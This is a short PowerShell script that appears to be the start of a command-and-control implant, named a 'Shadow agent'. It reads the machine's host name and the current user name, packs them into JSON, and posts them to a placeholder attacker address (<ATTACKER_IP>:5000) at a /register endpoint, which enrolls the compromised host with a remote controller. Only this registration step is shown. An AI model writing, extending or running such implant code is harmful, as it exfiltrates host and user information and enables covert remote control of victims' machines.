$ip = "<ATTACKER_IP>"
$port = 5000

$host_name = [System.Net.Dns]::GetHostName()
# $user_name = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$user_name = $env:USERNAME
$sentinel_link = ("http://" + $ip + ":" + $port)

$data = @{"username" = $user_name;
"hostname" = $host_name;
} | ConvertTo-Json


function register() {
    # Registers self as a new Shadow agent.
    try {
        $response = Invoke-WebRequest -Uri ($sentinel_link + "/register") -Method Post -Body $data -ContentType "application/json"
    }
    catch {
        throw $_
    }
}